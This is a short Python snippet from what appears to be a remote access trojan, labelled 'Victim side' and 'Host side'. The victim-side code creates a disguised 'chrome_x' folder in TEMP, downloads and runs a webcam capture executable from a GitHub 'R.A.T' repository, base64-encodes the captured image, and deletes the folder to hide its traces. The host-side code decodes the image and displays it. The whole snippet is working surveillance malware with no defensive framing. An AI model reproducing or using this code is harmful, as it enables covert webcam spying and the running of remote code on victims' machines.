#Victim side
import os, base64
import urllib.request as url

os.chdir(os.getenv("TEMP"))
os.mkdir('chrome_x')
os.chdir("chrome_x")
url.urlretrieve("https://github.com/Stormwolfplayz/R.A.T/raw/main/Apps/CommandCam.exe", "CommandCam.exe")
os.system("CommandCam")
with open("image.bmp", "rb") as image:
    b64string = base64.b64encode(image.read())
os.chdir("../")
os.system("DEL /f /q /s chrome_x")
os.rmdir("chrome_x")
#Host side
from PIL import Image
import io
image = b64string
f = io.BytesIO(base64.b64decode(image))
pilimage = Image.open(f)
pilimage.show()